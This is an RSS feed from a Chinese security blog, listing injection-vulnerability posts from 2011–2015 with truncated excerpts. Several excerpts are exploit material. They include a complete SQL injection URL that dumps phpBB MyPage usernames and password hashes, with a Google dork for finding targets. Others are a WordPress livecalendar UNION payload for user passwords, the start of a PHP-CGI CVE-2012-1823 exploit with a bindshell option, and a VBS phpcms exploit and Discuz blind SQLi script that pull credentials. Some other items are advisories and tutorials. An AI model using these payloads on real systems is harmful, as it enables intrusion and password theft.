<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Injection on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
    <link>https://lcx.cc/categories/injection/</link>
    <description>Recent content in Injection on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
    <lastBuildDate>Tue, 24 Mar 2015 15:28:43 +0800</lastBuildDate><atom:link href="https://lcx.cc/categories/injection/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>WebSocket 中转注入工具(for SQL Injection tools: sqlmap, etc.)</title>
      <link>https://lcx.cc/post/4507/</link>
      <pubDate>Tue, 24 Mar 2015 15:28:43 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4507/</guid>
      <description>WebSocket 中转注入工具(for SQL Injection tools: sqlmap, etc.) Ricter (๑`･ᴗ･´๑) | 2015-03-22 23:55 https://github.com/RicterZ/websocket-injection Installation git clone https://github.com/RicterZ/websocket-injection cd websocket-injection pip install -r requirements.txt Usage python main.py --port=8888 python sqlmap.py -u &#34;http://localhost:8888/?url=[target]&amp;amp;data=[sqli]&#34; -p data MIT 各种求 star ~ [原文地址]</description>
    </item>
    
    <item>
      <title>Piwigo &lt;= v2.6.0 - Blind SQL Injection</title>
      <link>https://lcx.cc/post/4446/</link>
      <pubDate>Sun, 16 Nov 2014 23:40:40 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4446/</guid>
      <description>Piwigo &amp;lt;= v2.6.0 - Blind SQL Injection -------------------------------------------------------------------------------- From: Manuel Garcia Cardenas &amp;lt;advidsec () gmail com&amp;gt; Date: Wed, 12 Nov 2014 09:56:22 +0100 -------------------------------------------------------------------------------- ============================================= MGC ALERT 2014-001 - Original release date: January 12, 2014 - Last revised: November 12, 2014 - Discovered by: Manuel García Cárdenas - Severity: 7,1/10 (CVSS Base Score) ============================================= I. VULNERABILITY ------------------------- Blind</description>
    </item>
    
    <item>
      <title>Zabbix SQL Injection/RCE – CVE-2013-5743</title>
      <link>https://lcx.cc/post/3959/</link>
      <pubDate>Fri, 18 Oct 2013 09:30:09 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3959/</guid>
      <description>from:https://www.corelan.be/index.php/2013/10/04/zabbix-sql-injectionrce-cve-2013-5743/ 0x00 背景 该漏洞于2013年9月11号提交，9月23号得到确认，10月2号发布补丁。 新出的0day，可以通过sql注入直接进入后台，并执行系统</description>
    </item>
    
    <item>
      <title>SQL注射/SQL Injection漏洞</title>
      <link>https://lcx.cc/post/3540/</link>
      <pubDate>Tue, 28 May 2013 15:37:48 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3540/</guid>
      <description>0x00 相关背景介绍 随着互联网web和信息技术的发展，在web后端作为存储和管理的的数据库也得到了广泛的应用，与web结合较为紧密的数据库包括My</description>
    </item>
    
    <item>
      <title>Ruby On Rails find_by_* SQL Injection （CVE-2012-6496）</title>
      <link>https://lcx.cc/post/3259/</link>
      <pubDate>Sun, 06 Jan 2013 11:10:26 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3259/</guid>
      <description>详情分析链接在此：http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnera</description>
    </item>
    
    <item>
      <title>Microsoft Windows Shell Command Injection - MS12-048</title>
      <link>https://lcx.cc/post/2696/</link>
      <pubDate>Thu, 19 Jul 2012 11:35:22 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2696/</guid>
      <description>CVE-2012-0175 Background Windows File Association allows an application to define a handler that should be called for each operation on a specific file type. For example, WinRAR registers the file type .RAR in the following manner: The Open action defined for this file type dictates how the handler should be called upon opening the file. The command that will be executed for this example of WinRAR is: &#34;C:\Program Files\WinRAR\WinRAR.exe&#34; &#34;%1&#34;</description>
    </item>
    
    <item>
      <title>Magento eCommerce Platform XXE Injection利用</title>
      <link>https://lcx.cc/post/2679/</link>
      <pubDate>Sat, 14 Jul 2012 08:58:28 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2679/</guid>
      <description>0x1 在wooyun-zone&amp;nbsp;xsser的文章zend&amp;nbsp;framework文件读取漏洞分析中有提及到magento，下面是</description>
    </item>
    
    <item>
      <title>对 zend framework xxe injection 的分析</title>
      <link>https://lcx.cc/post/2670/</link>
      <pubDate>Thu, 12 Jul 2012 10:46:28 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2670/</guid>
      <description>前几天网上爆出一个zend framework 漏洞 作者：mkods 具体描述如下: https://www.sec-consult.com/files/20120626-0_zend_framework_xxe_injection.txt ; 根据描述，该漏洞是发生在zend 框架 xmlrpc模块的一个 xxe(XML external entity) injec</description>
    </item>
    
    <item>
      <title>hotelphpweb SQL injection</title>
      <link>https://lcx.cc/post/2627/</link>
      <pubDate>Sat, 30 Jun 2012 10:42:38 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2627/</guid>
      <description>phpweb下的一套酒店系统。 news/html/index.php //定义模块名和页面名 PageSet(&#34;news&#34;,&#34;detail&#34;); 跟踪PageSet函数。 function pageset( $coltype, $pagename ) { global $GLOBALS[&#39;msql&#39;]; $msql-&amp;gt;query( &#34;select * from {P}_base_pageset where coltype=&#39;{$coltype}&#39; and pagename=&#39;{$pagename}&#39;&#34; ); //....省略代码N行</description>
    </item>
    
    <item>
      <title>飞飞影视系统PHP版 v1.9 injection exploit</title>
      <link>https://lcx.cc/post/2512/</link>
      <pubDate>Mon, 21 May 2012 09:34:41 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2512/</guid>
      <description>昨天整的黑客论坛旁站上的程序，发现用的人还真不少。 简单的写了个exp。无聊之作... &amp;lt;?php /** * 飞飞影视管理系统 SQL injection * 飞飞影视系统PHP版 v1.9 injection exploit *</description>
    </item>
    
    <item>
      <title>91736cms Getip SQL Injection &amp; 后台妙拿 WebShell</title>
      <link>https://lcx.cc/post/2505/</link>
      <pubDate>Fri, 18 May 2012 10:32:41 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2505/</guid>
      <description>Author:Yaseng&amp;nbsp;&amp;nbsp;&amp;amp;&amp;amp;Desperado Team:CodePlay Chinaz&amp;nbsp;下其源码&amp;nbsp;&amp;nbsp;&amp;nbsp;读之发现有万恶的&amp;nbsp;GetIp()&amp;nbsp; //获取IP function</description>
    </item>
    
    <item>
      <title>PHP CGI Argument Injection Exploit CVE-2012-1823</title>
      <link>https://lcx.cc/post/2473/</link>
      <pubDate>Tue, 08 May 2012 12:18:35 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2473/</guid>
      <description>&amp;lt;?php /* *PHP CGI Argument Injection Exploit CVE-2012-1823 *by:cfking *bbs:www.90sec.org */ set_time_limit(0); $help=&#39; [&amp;gt;] php-cgi Remote code Execution Exploit CVE-2012-1823 [&amp;gt;] by:cfking@90sec.org [&amp;gt;] Usage: php &#39;.$argv[0].&#39; host index.php &amp;lt;1/2/3&amp;gt; &amp;lt;ip/Command&amp;gt; &amp;lt;port&amp;gt; [&amp;gt;] Example: php &#39;.$argv[0].&#39; 127.0.0.1 / 2 &#39;; if($argc&amp;lt;4)exit($help); print_r (&#39; [&amp;gt;] PHP CGI Argument Injection Exploit CVE-2012-1823 [&amp;gt;] by:cfking@90sec.org&#39;); $host=$argv[1]; $filename=$argv[2]; if($argv[3]==&#39;1&#39;){ $port=$argv[5]? $argv[5]:4444; if(!$argv[4])exit(&#34;\n[-] Please enter IP and PORT\n&#34;); print &#34;\n[+] Bindshell IP $argv[4] PORT $port\n&#34;; $payload=$argv[4].&#39;:&#39;.$port;</description>
    </item>
    
    <item>
      <title>MyPage plugin (phpBB) SQL Injection (All versions)</title>
      <link>https://lcx.cc/post/2014/</link>
      <pubDate>Thu, 08 Dec 2011 14:51:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2014/</guid>
      <description>==================================================== MyPage&amp;nbsp;plugin&amp;nbsp;(phpBB)&amp;nbsp;SQL&amp;nbsp;Injection&amp;nbsp;(All&amp;nbsp;versions) ==================================================== ==================================================== Improve&amp;nbsp;your&amp;nbsp;hacking&amp;nbsp;knowledges&amp;nbsp;! ==================================================== ==================================================== VISIT&amp;nbsp;http://HackSociety.net&amp;nbsp;! ==================================================== #&amp;nbsp;Exploit&amp;nbsp;Title:&amp;nbsp;SQL&amp;nbsp;Injection&amp;nbsp;on&amp;nbsp;the&amp;nbsp;plugin&amp;nbsp;phpBB&amp;nbsp;plugin&amp;nbsp;MyPage #&amp;nbsp;Google&amp;nbsp;Dork:&amp;nbsp;inurl:&#34;mypage.php?id=&#34; #&amp;nbsp;Date:&amp;nbsp;06/12/2011 #&amp;nbsp;Author:&amp;nbsp;CrazyMouse&amp;nbsp;(from&amp;nbsp;HackSociety.net) #&amp;nbsp;Version:&amp;nbsp;0.2.3&amp;nbsp;(this&amp;nbsp;is&amp;nbsp;the&amp;nbsp;last&amp;nbsp;avaliable&amp;nbsp;version,&amp;nbsp;older&amp;nbsp;versions&amp;nbsp;are&amp;nbsp;also&amp;nbsp;vulnerable) #&amp;nbsp;Tested&amp;nbsp;on:&amp;nbsp;Windows&amp;nbsp;7&amp;nbsp;x64&amp;nbsp;(Firefox) ==================================================== VISIT&amp;nbsp;http://HackSociety.net&amp;nbsp;! ==================================================== [~]&amp;nbsp;Exploit: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost/forum/ [~]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost/forum/mypage.php?id=&amp;nbsp;(SQL) [~]&amp;nbsp;Example: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://server/forum/mypage.php?id=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28select+concat%280x7e%2C0x27%2Cphpbb_users.user_id%2C0x5e%2Cphpbb_users.user_type%2C0x5e%2Cphpbb_users.group_id%2C0x5e%2Cphpbb_users.username%2C0x5e%2Cphpbb_users.user_password%2C0x27%2C0x7e%29+from+%60forum_domperm%60.phpbb_users+limit+5%2C1%29+%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271 ==================================================== #&amp;nbsp;Thanks&amp;nbsp;to Crassus ==================================================== ==================================================== VISIT&amp;nbsp;http://HackSociety.net&amp;nbsp;! ==================================================== 留言评论（旧系统）： 【匿名者】 @ 2012-09-08 02:23:56 You put the lime in the coconut and drink the arctile up. 本站回复： [暂无回复</description>
    </item>
    
    <item>
      <title>DiyPage8.3 orderby blind SQL injection &amp;&amp; code execution</title>
      <link>https://lcx.cc/post/2008/</link>
      <pubDate>Thu, 08 Dec 2011 08:14:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2008/</guid>
      <description>- 从核心降荣誉&amp;nbsp;&amp;nbsp;从荣誉贬会员&amp;nbsp; &amp;nbsp;现在连ID也要被清了。。&amp;nbsp;&amp;nbsp;鸭梨山大 一、前台注</description>
    </item>
    
    <item>
      <title>Wordpress plugin livecalendar SQL injection</title>
      <link>https://lcx.cc/post/1928/</link>
      <pubDate>Sun, 20 Nov 2011 22:49:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1928/</guid>
      <description>/**************************************************** *&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;Wordpress plugin livecalendar SQL injection *&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;From WwW.bhst.OrG Black-Hat Security Team *&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;Author LengF&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;Contact:81sec.com ****************************************************/ 漏洞文件： wp-content/plugins/livecalendar/kcalendar.php POC: http://hackit.com/wp-content/plu ... th=10&amp;amp;catid=-1/**/union/**/select/**/user_login,user_pass/**/from wp_users/* &amp;nbsp;&amp;nbsp;&amp;nbsp; 这个injection比较低级，不过这个插件貌似网上很难找到。分享给大家，</description>
    </item>
    
    <item>
      <title>关于 Blind SQL Injection （SQL盲注） 的利用方法总结</title>
      <link>https://lcx.cc/post/1865/</link>
      <pubDate>Sat, 29 Oct 2011 19:34:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1865/</guid>
      <description>关于 Blind SQL Injection 的利用方法总结，关于 Blind SQL Injection （SQL盲注） 的利用方法总结。 文/LengF Date/2011-10-28 首发：www.bhst.org 说明：支持一下t00ls的论</description>
    </item>
    
    <item>
      <title>kuwebs cms sql injection exp - 脚本漏洞</title>
      <link>https://lcx.cc/post/1790/</link>
      <pubDate>Sat, 24 Sep 2011 21:48:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1790/</guid>
      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; By：匿名者 介绍： &amp;nbsp;&amp;nbsp;&amp;nbsp; 酷纬企业网站管理系统是酷纬信息开发的为企业网站提供一揽子解决方案的营销型网站系统，后台采用PHP+Mysql架构，内置</description>
    </item>
    
    <item>
      <title>基于 SQL 注入（sql injection） 介绍一些注射技巧 - 技术文章</title>
      <link>https://lcx.cc/post/1624/</link>
      <pubDate>Thu, 28 Jul 2011 20:33:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1624/</guid>
      <description>By：wooden 写本文的目的在于记录并且交流,欢迎各种大牛批评指正:) &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;传统的检测注射方法是通过： and 1=1 , and 1=2 来判断真假从而</description>
    </item>
    
    <item>
      <title>Xpress Engine Injection 到后台本地包含webshell - 技术文章</title>
      <link>https://lcx.cc/post/1616/</link>
      <pubDate>Wed, 27 Jul 2011 00:36:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1616/</guid>
      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; By：wooden &amp;nbsp;&amp;nbsp;&amp;nbsp; 一次在渗透中遇到XE的程序,查了下,发现是韩国的一套比较常见的Cms,然后尝试挖掘漏洞,可惜一通扫描,检测下来没有任何</description>
    </item>
    
    <item>
      <title>SOBI2 2.9.3.2 Joomla! Component Blind SQL Injections</title>
      <link>https://lcx.cc/post/1580/</link>
      <pubDate>Fri, 15 Jul 2011 20:13:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1580/</guid>
      <description># Exploit Title: SOBI2 2.9.3.2 Joomla! Component Blind SQL Injections # Date: 13 July 2011 # Author: jdc # Version: 2.9.3.2 # Fixed In: 2.9.4 Versions prior to 2.9.4 suffer from a blind sql injection in both the &#34;tag&#34; and &#34;letter&#34; parameters. The request MUST reach the site with these parameters urlencoded for the injection to succeed.&amp;nbsp;&amp;nbsp; POSTDATA: option=com_sobi2&amp;amp;tmpl=component&amp;amp;tag=[Encoded SQL] POSTDATA: option=com_sobi2&amp;amp;tmpl=component&amp;amp;letter=[Encoded SQL]</description>
    </item>
    
    <item>
      <title>【Exp】phpcms v2.4 SQL injection exploit (test vbs_exp)</title>
      <link>https://lcx.cc/post/1420/</link>
      <pubDate>Thu, 09 Jun 2011 12:29:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1420/</guid>
      <description>以下是引用片段： on&amp;nbsp;&amp;nbsp; error&amp;nbsp;&amp;nbsp; resume&amp;nbsp;&amp;nbsp; next Set objArgs = WScript.Arguments dim my_http dim my_path dim fjhgx print_r() if objArgs.length = 0 then quit_print() End if if objArgs(0) = null then &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; quit_print() Else &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; my_http = objArgs(0) End if if objArgs(1) = null then &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; quit_print() Else &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; my_path = objArgs(1) End if &amp;nbsp; Set Http = CreateObject(&#34;Microsoft.XMLHTTP&#34;) Http.Open &#34;get&#34;,&#34;http://&#34;&amp;amp;my_http&amp;amp;my_path&amp;amp;&#34;vote.php?action=result&amp;amp;voteid=999999.9+UNION+ALL+SELECT+(Select concat(0x7e,0x27,userid,0x27,username,0x27,password,0x7e,0x27) FROM phpcms_member where</description>
    </item>
    
    <item>
      <title>9959 网店系统 v5.0 Blind SQL injection exploit</title>
      <link>https://lcx.cc/post/1376/</link>
      <pubDate>Fri, 03 Jun 2011 13:08:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1376/</guid>
      <description>作者：闷豆、 以下是引用片段： &amp;lt;?php print_r(&#39; +---------------------------------------------------------------------------+ &amp;nbsp;9959网店系统 v5.0 Blind SQL injection exploit by mendou &amp;nbsp;官方网站：[url]www.9959shop.com</description>
    </item>
    
    <item>
      <title>XOOPS video tube 任意版本插件 SQL Injection</title>
      <link>https://lcx.cc/post/1375/</link>
      <pubDate>Fri, 03 Jun 2011 13:04:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1375/</guid>
      <description>作者：Knife XOOPS&amp;nbsp;&amp;nbsp;任意版本 测试站点版本：2.4.4 作者：knife 插件：video&amp;nbsp;tube&amp;nb</description>
    </item>
    
    <item>
      <title>Discuz! X1-1.5 notify_credit.php Blind SQL injection exploit</title>
      <link>https://lcx.cc/post/1372/</link>
      <pubDate>Fri, 03 Jun 2011 12:46:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1372/</guid>
      <description>&amp;lt;?php print_r(&#39; +---------------------------------------------------------------------------+ Discuz! X1-1.5 notify_credit.php Blind SQL injection exploit by toby57 2010.11.05 mail: toby57 at 163 dot com team: http://www.wolvez.org +---------------------------------------------------------------------------+ &#39;); if ($argc &amp;lt; 2) { print_r(&#39; +---------------------------------------------------------------------------+ Usage: php &#39;.$argv[0].&#39; url [pre] Example: php &#39;.$argv[0].&#39; http://localhost/ php &#39;.$argv[0].&#39; http://localhost/ xss_ +---------------------------------------------------------------------------+ &#39;); exit; } error_reporting(7); ini_set(&#39;max_execution_time&#39;, 0); $url = $argv[1]; $pre = $argv[2]?$argv[2]:&#39;pre_&#39;; $target = parse_url($url); extract($target); $path .= &#39;/api/trade/notify_credit.php&#39;; $hash = array(); $hash = array_merge($hash, range(48,</description>
    </item>
    
    <item>
      <title>《Code Injection》 - PHP Eval 代码注入执行</title>
      <link>https://lcx.cc/post/1371/</link>
      <pubDate>Tue, 31 May 2011 03:52:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/1371/</guid>
      <description>作者：菲 &amp;amp; 2月30日 开始测试 http://cpd.111111.fl.us/gis/reports/output.php?id=ImpactFeesReport&amp;amp;month=all&amp;amp;year=all&amp;amp;fee_type=trans1&amp;amp;fee_status=reversed 上面链接是一个Code Injection注入连接，形成的原理是变量没有经过过滤就放入了eval()函数中执行造</description>
    </item>
    
  </channel>
</rss>
